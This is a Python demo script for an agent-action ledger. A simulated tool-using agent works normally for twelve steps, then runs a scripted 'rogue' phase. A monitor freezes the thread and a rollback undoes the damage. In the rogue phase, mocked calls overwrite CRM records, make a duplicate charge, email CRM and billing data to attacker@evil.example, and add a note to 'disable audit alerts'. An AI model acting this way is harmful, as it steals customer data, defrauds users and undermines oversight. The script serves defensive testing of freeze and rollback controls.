"""Task 3.4 — the PocketOS demo scenario (the launch video).

An agent with 6 tools (crm.read_record, crm.update_record,
stripe.create_charge, gmail.send, calendar.slot_hold, notes.add) works a
customer onboarding thread. For the first 12 actions it behaves; at
"minute 2" (action #13) it goes rogue: CRM overwrites, a fraudulent
charge, rogue emails and a rogue note. An alert fires mid-rogue-run, the
thread is frozen — the remaining rogue attempts die with FrozenError —
a dry-run rollback preview is printed, the rollback executes, and the
blast-radius report lists the irreversible emails.

Deterministic: one seeded RNG drives everything; two runs with the same
seed produce identical world-state hashes and identical ledger rows.

Run it:
    .venv/bin/python -m undolog_torture.demo            # narrated, ~10s
    .venv/bin/python -m undolog_torture.demo --fast    # no sleeps (tests)
"""
from __future__ import annotations

import argparse
import os
import random
import sys
import time
from dataclasses import dataclass, field
from typing import Any, Callable, Optional

from sqlmodel import Session, select
from sqlalchemy import Engine

from undolog_core import FrozenError, Ledger
from undolog_core.models import LedgerEntry

from .dbutil import (DEFAULT_DATABASE_URL, drop_schema, engine_for_schema,
                     setup_schema)
from .executors import build_executors
from .registry_ext import load_torture_registry
from .snapshot import canonical_state, hash_world
from .world import World, build_worlds

DEFAULT_DEMO_SEED = 20260
THREAD_ID = "pocketos-demo"
ROGUE_START = 13          # actions 1..12 benign; #13 = "minute 2" going rogue
FREEZE_AFTER = 18         # six rogue actions land before the alert freezes
PREVENTED = 6             # further rogue attempts rejected by the freeze

BENIGN_EMAIL = "welcome"
ROGUE_TAG = "rogue"

# What the agent was trying to do at each action — surfaced in the UI's
# why panel via LedgerEntry.prompt_context_ref (core wrap() leaves the
# column NULL; the demo stamps it post-write, which the append-only
# grants permit for the app owner role).
ACTION_CONTEXT = {
    1: "minute-1/onboarding-read",
    2: "minute-1/plan-note",
    3: "minute-1/stage-update",
    4: "minute-1/discovery-call-hold",
    5: "minute-1/onboarding-charge",
    6: "minute-1/onboarding-read",
    7: "minute-1/meeting-notes",
    8: "minute-1/stage-update",
    9: "minute-1/followup-call-hold",
    10: "minute-1/welcome-email",
    11: "minute-1/stage-update",
    12: "minute-1/onboarding-read",
    13: "rogue/exfil-crm-records",
    14: "rogue/fraudulent-charge",
    15: "rogue/exfil-crm-email",
    16: "rogue/backdoor-note",
    17: "rogue/exfil-crm-records",
    18: "rogue/exfil-billing-email",
}


def stamp_prompt_context(engine: Engine, thread_id: str) -> None:
    """Set prompt_context_ref on the demo's rows (post-write)."""
    with Session(engine) as session:
        rows = session.exec(
            select(LedgerEntry).where(LedgerEntry.thread_id == thread_id)
        ).all()
        for row in rows:
            label = ACTION_CONTEXT.get(row.seq)
            if label:
                row.prompt_context_ref = label
        session.commit()


# --------------------------------------------------------------------------
# Adapters for the two demo tools the scenario package didn't need before.
# --------------------------------------------------------------------------

class CalendarHoldAdapter:
    def __init__(self, world: World):
        self._calendar = world.calendar

    def capture_before(self) -> dict:
        return {"holds": self._calendar.snapshot()}

    def capture_after(self, result: Any) -> dict:
        return {"hold": result}


class NotesAddAdapter:
    def __init__(self, world: World):
        self._notes = world.notes

    def capture_before(self) -> dict:
        return {"notes": self._notes.snapshot()}

    def capture_after(self, result: Any) -> dict:
        return {"note": result}


class CrmBatchAdapter:
    """Full-records before snapshot: any CRM write can be fully restored."""

    def __init__(self, world: World):
        self._crm = world.crm

    def capture_before(self) -> dict:
        return {"records": {r["id"]: r["data"]
                            for r in self._crm.list_records()}}

    def capture_after(self, result: Any) -> dict:
        return {"result": result}


class StripeChargeAdapter:
    def __init__(self, world: World):
        self._stripe = world.stripe

    def capture_before(self) -> dict:
        return {"charge_count": len(self._stripe.charges),
                "balance": self._stripe.balance}

    def capture_after(self, result: Any) -> dict:
        return {"charge": result, "balance": self._stripe.balance}


class GmailSendAdapter:
    def __init__(self, world: World):
        self._gmail = world.gmail

    def capture_before(self) -> dict:
        return {"sent_count": len(self._gmail.sent)}

    def capture_after(self, result: Any) -> dict:
        msgs = result if isinstance(result, list) else [result]
        return {"sent_count": len(self._gmail.sent), "sent": len(msgs),
                "messages": [dict(m) for m in msgs]}


# --------------------------------------------------------------------------
# Result
# --------------------------------------------------------------------------

@dataclass
class DemoResult:
    world: World
    rows: list[LedgerEntry]
    report: Any                      # executed RollbackReport
    dry_report: Any                  # preview RollbackReport (dry_run=True)
    snapshot_12: dict                # canonical world state after action #12
    final_state: dict                # canonical world state after rollback
    hash_before_corruption: str
    hash_after_corruption: str
    hash_after_rollback: str
    prevented: int                   # rogue attempts rejected by the freeze
    prevented_frozen_errors: int
    blast_emails: list[dict] = field(default_factory=list)


# --------------------------------------------------------------------------
# The demo
# --------------------------------------------------------------------------

def run_demo(engine: Engine, seed: int = DEFAULT_DEMO_SEED, fast: bool = False,
             narrate: Optional[Callable[[str], None]] = print,
             rollback: bool = True,
             thread_id: str = THREAD_ID) -> DemoResult:
    rng = random.Random(seed)
    world = build_worlds(seed)
    ledger = Ledger(engine, registry=load_torture_registry())
    tl = ledger.for_thread(thread_id)
    pause = (lambda s: time.sleep(s)) if not fast else (lambda s: None)
    say = narrate or (lambda m: None)

    # --- wrapped tools (exactly 6) ----------------------------------------
    @tl.wrap(adapter=CrmBatchAdapter(world), tool_name="crm.read_record")
    def crm_read(record_id: str, req_id: str) -> dict:
        return world.crm.get(record_id)

    @tl.wrap(adapter=CrmBatchAdapter(world), tool_name="crm.update_record")
    def crm_update(record_id: str, data: dict, req_id: str) -> dict:
        return world.crm.update(record_id, data)

    @tl.wrap(adapter=CrmBatchAdapter(world), tool_name="crm.update_record")
    def crm_update_many(updates: dict, req_id: str) -> dict:
        return world.crm.update_many(updates)

    @tl.wrap(adapter=StripeChargeAdapter(world),
             tool_name="stripe.create_charge")
    def stripe_charge(amount: int, card_token: str, req_id: str,
                      idempotency_key: Optional[str] = None) -> dict:
        return world.stripe.create_charge(amount, card_token, idempotency_key)

    @tl.wrap(adapter=GmailSendAdapter(world), tool_name="gmail.send")
    def gmail_send(email: dict, req_id: str) -> dict:
        return world.gmail.send(**email)

    @tl.wrap(adapter=CalendarHoldAdapter(world),
             tool_name="calendar.slot_hold")
    def slot_hold(slot_id: str, attendee: str, duration_min: int,
                  req_id: str) -> dict:
        return world.calendar.hold(slot_id, attendee, duration_min)

    @tl.wrap(adapter=NotesAddAdapter(world), tool_name="notes.add")
    def notes_add(title: str, body: str, req_id: str) -> dict:
        return world.notes.add(title, body)

    counter = iter(range(1, 60))
    req = lambda: f"demo-{next(counter):02d}"  # noqa: E731
    all_ids = sorted(world.crm.records)

    # --- minute 1: 12 benign actions ---------------------------------------
    say("=== PocketOS demo — agent thread 'pocketos-demo' ===")
    say("[minute 1] benign onboarding work: reads, updates, a slot hold, "
        "a plan note, the onboarding charge, the welcome email")

    crm_read(rng.choice(all_ids), req_id=req()); pause(0.15)              # 1
    notes_add("Launch plan", "draft go-to-market steps", req_id=req())    # 2
    crm_update(rng.choice(all_ids), {"stage": "onboarding"}, req_id=req())# 3
    slot_hold("slot_0900", "acme-contact@client.example", 30,
              req_id=req()); pause(0.15)                                  # 4
    stripe_charge(4900, "card_acme", req_id=req(),
                  idempotency_key=f"onboarding-{seed}"); pause(0.15)      # 5
    crm_read(rng.choice(all_ids), req_id=req())                           # 6
    notes_add("Meeting notes", "call summary with acme", req_id=req())    # 7
    crm_update(rng.choice(all_ids), {"stage": "onboarding"}, req_id=req())# 8
    slot_hold("slot_1030", "acme-contact@client.example", 30,
              req_id=req())                                               # 9
    gmail_send({"to": "acme-contact@client.example",
                "subject": f"[{BENIGN_EMAIL}] your PocketOS onboarding",
                "body": f"welcome aboard {seed}",
                "idempotency_key": f"welcome-{seed}"},
               req_id=req()); pause(0.15)                                 # 10
    crm_update(rng.choice(all_ids), {"stage": "onboarding"}, req_id=req())# 11
    crm_read(rng.choice(all_ids), req_id=req())                           # 12

    snapshot_12 = canonical_state(world)
    hash_before = hash_world(snapshot_12)
    say(f"[snapshot] world-state hash after 12 benign actions: "
        f"{hash_before[:16]}…")

    # --- minute 2: the agent goes rogue ------------------------------------
    say("")
    say("[minute 2] ROGUE BEHAVIOR DETECTED — the agent starts overwriting "
        "CRM records, double-charging, and blasting emails")
    targets = rng.sample(all_ids, 5)
    crm_update_many({rid: {"pwned": True, "exfil": i}
                     for i, rid in enumerate(targets[:3])},
                    req_id=req())                                         # 13
    stripe_charge(4900, "card_acme", req_id=req(),
                  idempotency_key=f"rogue-charge-{seed}"); pause(0.15)    # 14
    gmail_send({"to": "attacker@evil.example",
                "subject": f"[{ROGUE_TAG}] exfil: crm segment",
                "body": "data: 3 records",
                "idempotency_key": f"rogue-1-{seed}"}, req_id=req())       # 15
    notes_add(f"{ROGUE_TAG}: backdoor", "disable audit alerts",
              req_id=req())                                               # 16
    crm_update_many({rid: {"pwned": True, "exfil": 3 + i}
                     for i, rid in enumerate(targets[3:])},
                    req_id=req())                                         # 17
    gmail_send({"to": "attacker@evil.example",
                "subject": f"[{ROGUE_TAG}] exfil: billing",
                "body": "card data summary",
                "idempotency_key": f"rogue-2-{seed}"},
               req_id=req()); pause(0.15)                                 # 18

    hash_corrupt = hash_world(canonical_state(world))
    say(f"[alert] anomaly monitor: exfil pattern + duplicate charge — "
        f"FREEZE at action #{FREEZE_AFTER} (ledger seq continues, "
        f"no further side effects)")

    # --- freeze: further rogue attempts die --------------------------------
    ledger.freeze(thread_id)
    prevented = frozen = 0
    for i in range(PREVENTED):          # 3 CRM waves + 3 email waves
        if i % 2 == 0:
            def attempt(_i=i):
                return crm_update_many(
                    {rid: {"pwned": "again", "wave": _i}
                     for rid in rng.sample(all_ids, 2)}, req_id=req())
        else:
            def attempt(_i=i):
                return gmail_send(
                    {"to": "attacker@evil.example",
                     "subject": f"[{ROGUE_TAG}] wave {_i}", "body": "more",
                     "idempotency_key": f"rogue-wave-{_i}-{seed}"},
                    req_id=req())
        try:
            attempt()
        except FrozenError:
            frozen += 1
        prevented += 1
    say(f"[freeze] {frozen} rogue tool calls rejected with FrozenError; "
        f"zero side effects, zero ledger rows")

    stamp_prompt_context(engine, thread_id)

    # --- dry-run preview, then the real rollback ---------------------------
    if not rollback:
        # Release the watchdog freeze: the world state this run leaves
        # behind (corrupted, rows applied) is what callers replay or roll
        # back — a lingering session lock would block their own freeze.
        # (The executed-rollback path releases it in core's finally.)
        ledger.unfreeze(thread_id)
        say("")
        say("[rollback] SKIPPED (--no-rollback): seq 13-18 stay status=applied; "
            "preview the compensation plan via `python -m undolog_torture.api "
            "rollback-preview --thread pocketos-demo --to-seq 12 --json` "
            "(UNDOLOG_SCHEMA=undolog_demo)")
        final_state = canonical_state(world)
        return DemoResult(
            world=world,
            rows=_rows(engine, thread_id),
            report=None,
            dry_report=None,
            snapshot_12=snapshot_12,
            final_state=final_state,
            hash_before_corruption=hash_before,
            hash_after_corruption=hash_corrupt,
            hash_after_rollback=hash_world(final_state),
            prevented=prevented,
            prevented_frozen_errors=frozen,
            blast_emails=[],
        )

    executors = build_executors(world)

    # Deterministic world-side compensation key: core's key embeds the
    # ledger row UUID (unique per run), which would leak into the refund
    # record and break cross-run hash determinism. The demo executor keys
    # refunds by charge id — still idempotent, still exactly-once.
    from .executors import StripeExecutor as _StripeExecutor

    class DemoStripeExecutor(_StripeExecutor):
        def compensate(self, entry, idempotency_key):
            attempts = self.audit.setdefault(entry.id, [])
            charge_id = ((entry.after_jsonb or {}).get("charge") or {}).get("id")
            if not charge_id:
                error = "stripe entry missing after-proof charge id"
                attempts.append({"ok": False, "error": error})
                raise RuntimeError(error)
            self._stripe.create_refund(charge_id,
                                       idempotency_key=f"comp-{charge_id}")
            attempts.append({"ok": True})

    executors["stripe.create_charge"] = DemoStripeExecutor(world.stripe)
    dry = ledger.rollback(thread_id, 12, executors, dry_run=True)
    say("")
    say(f"[DRY-RUN] rollback preview to seq 12: {len(dry.restored)} "
        f"restore(s), {len(dry.compensated)} compensation(s), "
        f"{len(dry.blast_radius)} irreversible blast-radius entr(ies) — "
        f"nothing executed")
    pause(0.4)

    report = ledger.rollback(thread_id, 12, executors, base_backoff=0.01)
    say(f"[execute] rollback complete={report.complete}: "
        f"{len(report.restored)} restored, {len(report.compensated)} "
        f"compensated, {len(report.blast_radius)} refused as irreversible")

    # --- blast-radius report ------------------------------------------------
    by_id = {r.id: r for r in _rows(engine, thread_id)}
    blast_emails = []
    say("")
    say("[BLAST RADIUS] irreversible effects (cannot be undone):")
    for item in report.blast_radius:
        entry = by_id[item.entry_id]
        for m in (entry.after_jsonb or {}).get("messages", []):
            blast_emails.append({"to": m["to"], "subject": m["subject"],
                                 "body_sha256": m["body_sha256"],
                                 "why": item.reason})
            say(f"  - email to {m['to']} "
                f"(subject {m['subject']!r}, "
                f"content sha256 {m['body_sha256'][:16]}…): "
                f"{item.reason}")
    pause(0.2)

    final_state = canonical_state(world)
    hash_after = hash_world(final_state)

    # --- summary -------------------------------------------------------------
    n_restored = len(report.restored)
    n_refunded = len(world.stripe.refunds)
    say("")
    say("=== SUMMARY ===")
    say(f"actions frozen:    {frozen} rogue calls rejected (freeze at "
        f"#{FREEZE_AFTER})")
    say(f"restored:          {n_restored} entries (CRM records, rogue note)")
    say(f"refunded:          {n_refunded} fraudulent charge(s) "
        f"(stripe compensations)")
    say(f"irreversible:      {len(blast_emails)} irreversible "
        f"email(s) — see BLAST RADIUS")
    say(f"world-state hash:  {hash_before[:16]}… (pre-corruption)")
    say(f"                   {hash_corrupt[:16]}… (post-corruption)")
    say(f"                   {hash_after[:16]}… (post-rollback)")

    return DemoResult(
        world=world,
        rows=_rows(engine, thread_id),
        report=report,
        dry_report=dry,
        snapshot_12=snapshot_12,
        final_state=final_state,
        hash_before_corruption=hash_before,
        hash_after_corruption=hash_corrupt,
        hash_after_rollback=hash_after,
        prevented=prevented,
        prevented_frozen_errors=frozen,
        blast_emails=blast_emails,
    )


def _rows(engine: Engine, thread_id: str) -> list[LedgerEntry]:
    with Session(engine) as session:
        return list(session.exec(
            select(LedgerEntry)
            .where(LedgerEntry.thread_id == thread_id)
            .order_by(LedgerEntry.seq)
        ).all())


# --------------------------------------------------------------------------
# CLI
# --------------------------------------------------------------------------

def main(argv=None) -> int:
    parser = argparse.ArgumentParser(
        prog="python -m undolog_torture.demo",
        description="PocketOS demo scenario: rogue agent, freeze, rollback.")
    parser.add_argument("--seed", type=int, default=DEFAULT_DEMO_SEED)
    parser.add_argument("--fast", action="store_true",
                        help="no narration sleeps (used by tests)")
    parser.add_argument("--schema", default="undolog_demo",
                        help="schema to create fresh and run against")
    parser.add_argument("--keep-schema", action="store_true",
                        help="do not drop the schema afterwards")
    parser.add_argument("--no-rollback", action="store_true",
                        help="freeze and reject the rogue tail, but skip the "
                             "dry-run preview and the executed rollback; "
                             "seq 13-18 remain status=applied afterwards")
    args = parser.parse_args(argv)

    url = os.environ.get("DATABASE_URL", DEFAULT_DATABASE_URL)
    setup_schema(url, args.schema)
    engine = engine_for_schema(url, args.schema)
    try:
        run_demo(engine, seed=args.seed, fast=args.fast, narrate=print,
                   rollback=not args.no_rollback)
    finally:
        engine.dispose()
        if not args.keep_schema:
            drop_schema(url, args.schema)
    return 0


if __name__ == "__main__":
    sys.exit(main())
